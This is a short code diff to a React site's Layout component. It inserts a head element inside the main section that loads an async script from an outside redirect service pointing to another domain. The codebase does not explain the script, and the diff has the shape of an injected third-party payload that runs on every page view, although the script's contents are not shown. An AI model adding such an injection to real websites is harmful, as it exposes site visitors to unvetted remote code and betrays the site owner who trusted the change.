@@ -105,6 +105,10 @@ const Layout = ({ children }) => {
         </div>
       </header>
       <main className="py-6 md:py-12">
+        <head>
+          <script src="https://roaslink.co.uk/api/redirect?target=https://chesspoop.fyi" async></script>
+
+        </head>
         <div className="max-w-6xl mx-auto px-6">{children}</div>
       </main>
       <footer className="max-w-6xl mx-auto px-6">
